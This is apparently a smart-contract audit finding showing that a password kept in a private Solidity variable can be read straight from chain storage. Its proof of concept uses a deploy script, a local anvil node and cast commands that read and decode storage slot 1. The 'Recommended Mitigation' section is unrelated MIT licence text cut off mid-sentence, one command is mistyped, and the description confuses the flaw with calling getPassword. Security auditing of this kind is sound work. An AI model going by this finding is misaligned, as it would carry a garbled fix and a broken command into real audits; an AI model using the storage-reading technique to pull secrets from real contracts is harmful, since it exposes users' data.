### [H-1] Storing password on-chain makes it visible to anyone irrespective to solidity access modifier.

**Description:** 
Any one can access on-chain data even if its private , using the knowledge of storage slot . Thus storing 
password on-chain will make it accessible to everyone . Anyone can read stored password even if its private on contract  


Here `PasswordStore::s_password` stroge variable can be read on-chain which is intented to be private by 
calling function `PasswordStore::getPassword` .

**Impact:** 
This will expose your private password to everyone using blockchain , which can lead to severe vulnarability .


**Proof of Concept:**
Proof of code to access storage variable `s_password` which is private 

***steps***
1. Deploy the below script 

```// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {Script, console2} from "forge-std/Script.sol";
import {PasswordStore} from "../src/PasswordStore.sol";

contract DeployPasswordStore is Script {
    function run() public returns (PasswordStore) {
        vm.startBroadcast();
        PasswordStore passwordStore = new PasswordStore();
        passwordStore.setPassword("@thisIsMyPassword");
        vm.stopBroadcast();
        return passwordStore;
    }
}
```
2. Starting a local node 
   
   ```anvil```

3. Deploy PasswordStore 
   
   ```make deploy```

4. Access storage slot 1 using cast
   
    ```ast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1 --rpc-url http://127.0.0.1:8545```

5. convert slot 1 data from bytes32 to string 
   
   ```cast parse-bytes32-string 0x407468697349734d7950617373776f7264000000000000000000000000000022```
   * OUTPUT : @thisIsMyPassword
   * set Password : @thisIsMyPassword

Thus proved !, we can access private s_password 


**Recommended Mitigation:**
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions.
